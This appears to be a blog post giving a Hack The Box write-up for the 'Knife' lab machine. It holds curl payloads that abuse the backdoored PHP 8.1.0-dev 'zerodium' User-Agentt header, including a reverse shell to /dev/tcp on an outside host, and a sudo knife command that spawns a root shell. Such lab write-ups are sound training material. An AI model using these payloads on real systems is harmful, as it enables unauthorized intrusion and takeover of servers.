---
layout: post
title: HTB Machine - Knife
subtitle: Writeup
cover-img: /assets/img/Scifi.1920x1080.jpg
thumbnail-img: /assets/img/Scifi.1920x1080.jpg
share-img: /assets/img/Scifi.1920x1080.jpg
tags: [ HTB, Hack the Box]
---

##### 2 ports are open:22 and 80. Webpage is static no interesting stuff.  

```bash
whatweb http://10.10.10.242
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]

Ubuntu Focal.
```
##### there is vuln on the PHP/8.1.0-dev. The user-agent can be modified to execute code. 

https://www.exploit-db.com/exploits/49933

##### there is a python script (in exploit folder) but basically the line with zerodium is the culprit. It can be done with curl too

##### poc 
```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('id');" | html2text
```
##### exploit
```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.14.2/4444 0>&1\"');" | html2text
```

##### set a netcat and gain access to the machine. Set terminal to taste. check release
```bash
lsb_release -a
```

##### no access to /root folder. id shows we are not in a priviledge group. sudo -l says that we can execute knife as a root without pass. Go to gtfobins to see if soemthing comes up with knife and it does. 
```bash
sudo knife exec -E 'exec "/bin/sh"'
``` 